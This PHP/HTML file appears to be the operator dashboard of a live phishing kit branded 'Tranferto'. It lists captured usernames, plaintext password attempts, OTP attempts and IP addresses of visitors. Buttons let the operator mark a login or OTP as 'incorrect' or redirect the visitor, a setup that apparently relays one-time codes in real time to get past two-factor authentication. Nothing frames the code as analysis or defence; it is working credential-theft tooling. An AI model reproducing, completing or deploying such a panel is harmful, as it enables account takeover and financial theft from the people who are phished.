<?php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: /admin/login');
    exit();
}

// Get logs data from session or database
$logs = $_SESSION['logs'] ?? [];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Logs - Tranferto</title>
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        /* Basic styling - reuse styles from admin-panel if needed */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f9fa;
        }
        .sidebar {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            z-index: 100;
            padding: 20px 0;
            box-shadow: inset -1px 0 0 rgba(0, 0, 0, .1);
            background-color: #fff;
            width: 220px;
        }
        .sidebar-sticky {
            position: relative;
            top: 0;
            height: calc(100vh - 40px);
            padding-top: .5rem;
            overflow-x: hidden;
            overflow-y: auto;
        }
        .logo-container {
            text-align: center;
            padding-bottom: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        .sidebar .nav-link {
            font-weight: 500;
            color: #333;
            padding: 10px 15px;
            margin: 5px 0;
            border-radius: 5px;
            display: flex;
            align-items: center;
        }
        .sidebar .nav-link i {
            margin-right: 10px;
            width: 20px;
            text-align: center;
        }
        .sidebar .nav-link.active,
        .sidebar .nav-link:hover {
            color: #fff;
            background-color: #4743c9;
        }
        .main-content {
            margin-left: 220px;
            padding: 20px;
        }
        .page-header {
             display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 10px;
            border-bottom: 1px solid #e3e6f0;
            margin-bottom: 30px;
        }
        .logs-table {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            padding: 20px;
            margin-bottom: 30px;
        }
        .action-buttons .btn {
            margin-right: 5px;
            font-size: 0.8rem;
            padding: 0.25rem 0.5rem;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
             <!-- Sidebar -->
            <nav class="col-md-2 d-md-block sidebar">
                <div class="logo-container">
                    <h3 style="color: #333; font-weight: bold;">TRANFERTO ADMIN</h3>
                </div>
                <div class="sidebar-sticky">
                    <ul class="nav flex-column">
                        <li class="nav-item">
                            <a class="nav-link" href="/admin/dashboard">
                                <i class="fas fa-tachometer-alt"></i> Dashboard
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/admin/change-password">
                                <i class="fas fa-key"></i> Change Password
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/admin/create-transaction">
                                <i class="fas fa-plus-circle"></i> Create Transaction
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link active" href="/admin/logs">
                                <i class="fas fa-clipboard-list"></i> Logs/Visitors
                            </a>
                        </li>
                         <li class="nav-item">
                            <a class="nav-link" href="/admin/logout">
                                <i class="fas fa-sign-out-alt"></i> Logout
                            </a>
                        </li>
                    </ul>
                </div>
            </nav>

            <!-- Main Content -->
            <main role="main" class="col-md-9 ml-sm-auto col-lg-10 px-md-4 main-content">
                <div class="page-header">
                    <h2>Visitor Logs & Actions</h2>
                    <a href="/admin/dashboard" class="btn btn-outline-secondary btn-sm">Back to Panel</a>
                </div>

                <?php if (isset($_SESSION['flash_messages'])): ?>
                    <div class="flash-messages">
                        <?php foreach ($_SESSION['flash_messages'] as $category => $message): ?>
                            <div class="alert alert-<?php echo $category; ?>">
                                <?php echo $message; ?>
                            </div>
                        <?php endforeach; ?>
                        <?php unset($_SESSION['flash_messages']); ?>
                    </div>
                <?php endif; ?>

                <div class="logs-table">
                     <div class="table-responsive">
                        <table class="table table-hover table-striped">
                            <thead class="table-light">
                                <tr>
                                    <th>Username</th>
                                    <th>Password Attempt</th>
                                    <th>OTP Attempt</th>
                                    <th>IP Address</th>
                                    <th>Timestamp</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                             <tbody>
                                <?php if (!empty($logs)): ?>
                                    <?php foreach ($logs as $log): ?>
                                    <tr>
                                        <td><?php echo htmlspecialchars($log['username']); ?></td>
                                        <td><?php echo htmlspecialchars($log['password_attempt']); ?></td>
                                        <td><?php echo htmlspecialchars($log['otp_attempt']); ?></td>
                                        <td><?php echo htmlspecialchars($log['ip']); ?></td>
                                        <td><?php echo date('Y-m-d H:i:s', strtotime($log['timestamp'])); ?></td>
                                        <td class="action-buttons">
                                            <button class="btn btn-warning btn-sm" 
                                                    onclick="markLoginIncorrect('<?php echo $log['id']; ?>')" 
                                                    title="Mark Login Incorrect">
                                                <i class="fas fa-times"></i> Login Incorrect
                                            </button>
                                            <button class="btn btn-info btn-sm" 
                                                    onclick="markOTPIncorrect('<?php echo $log['id']; ?>')" 
                                                    title="Mark OTP Incorrect">
                                                <i class="fas fa-key"></i> OTP Incorrect
                                            </button>
                                            <button class="btn btn-success btn-sm" 
                                                    onclick="redirectVisitor('<?php echo $log['id']; ?>')" 
                                                    title="Redirect Visitor">
                                                <i class="fas fa-exchange-alt"></i> Redirect
                                            </button>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    <tr>
                                        <td colspan="6" class="text-center">No log data found.</td>
                                    </tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </main>
        </div>
    </div>

    <script src="/assets/js/jquery.min.js"></script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <script>
        function markLoginIncorrect(logId) {
            if (confirm('Are you sure you want to mark this login attempt as incorrect?')) {
                fetch(`/admin/log/${logId}/mark-login-incorrect`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Failed to mark login as incorrect: ' + data.message);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred while marking the login as incorrect');
                });
            }
        }

        function markOTPIncorrect(logId) {
            if (confirm('Are you sure you want to mark this OTP attempt as incorrect?')) {
                fetch(`/admin/log/${logId}/mark-otp-incorrect`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Failed to mark OTP as incorrect: ' + data.message);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred while marking the OTP as incorrect');
                });
            }
        }

        function redirectVisitor(logId) {
            if (confirm('Are you sure you want to redirect this visitor?')) {
                fetch(`/admin/log/${logId}/redirect`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Failed to redirect visitor: ' + data.message);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred while redirecting the visitor');
                });
            }
        }
    </script>
</body>
</html> 